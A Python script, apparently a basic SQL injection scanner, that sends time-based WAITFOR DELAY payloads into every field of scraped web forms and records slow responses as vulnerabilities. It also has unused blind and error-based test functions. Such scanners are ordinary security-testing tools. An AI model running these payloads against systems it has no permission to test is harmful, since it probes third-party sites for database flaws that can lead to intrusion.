import requests
import time
import json
import logging
from statistics import mean, stdev

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def send_request(url, method, data, headers):
    response = requests.request(method, url, data=data, headers=headers)
    return response

def analyze_response_times(times):
    if len(times) > 2:
        avg_time = mean(times)
        deviation = stdev(times)
        return any(t > avg_time + 2 * deviation for t in times)
    return False

def test_time_based_sql_injection(url, data, expected_delay):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    start_time = time.time()
    response = send_request(url, 'POST', data, headers)
    duration = time.time() - start_time
    return duration > expected_delay, duration

def test_blind_sql_injection(url, true_payload, false_payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    true_response = send_request(url, 'GET', true_payload, headers).text
    false_response = send_request(url, 'GET', false_payload, headers).text
    return true_response != false_response

def test_error_based_sql_injection(url, payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    response = send_request(url, 'GET', payload, headers)
    return "error" in response.text.lower()

def analyze_vulnerabilities(scraped_data):
    vulnerabilities = []
    logger.info(f"Analyzing vulnerabilities for scraped data: {scraped_data}")
    time_based_payloads = ["';WAITFOR DELAY '0:0:5';--", "';WAITFOR DELAY '0:0:10';--", "';WAITFOR DELAY '0:0:15';--"]

    for page in scraped_data:
        url = page['URL']
        forms = page.get('Forms', [])
        for form in forms:
            action = form['action'] if form['action'] else url
            method = form['method']
            inputs = form['inputs']
            for input_field in inputs:
                name = input_field['name']
                if not name:
                    continue

                for payload in time_based_payloads:
                    data = {name: payload}
                    try:
                        delay_parts = payload.split(' ')[2].split(':')
                        expected_delay = int(delay_parts[2].replace("';--", ""))
                        is_vulnerable, duration = test_time_based_sql_injection(action, data, expected_delay)
                        vulnerabilities.append({
                            'url': url,
                            'parameter': name,
                            'is_vulnerable': is_vulnerable,
                            'response_time': duration,
                            'payload': payload
                        })
                    except IndexError:
                        logger.error(f"Error processing payload: {payload} for URL: {url}")
                    except Exception as e:
                        logger.error(f"Unexpected error: {e}")
    logger.info(f"Vulnerabilities found: {vulnerabilities}")
    return vulnerabilities

def load_scraped_data(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        logger.info(f"Scraped data loaded from {file_path}")
        return data
    except Exception as e:
        logger.error(f"Error loading scraped data from {file_path}: {e}")
        return []

if __name__ == '__main__':
    scraped_data = load_scraped_data('scraped_data.json')
    vulnerabilities = analyze_vulnerabilities(scraped_data)
    with open('vulnerabilities.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=4)
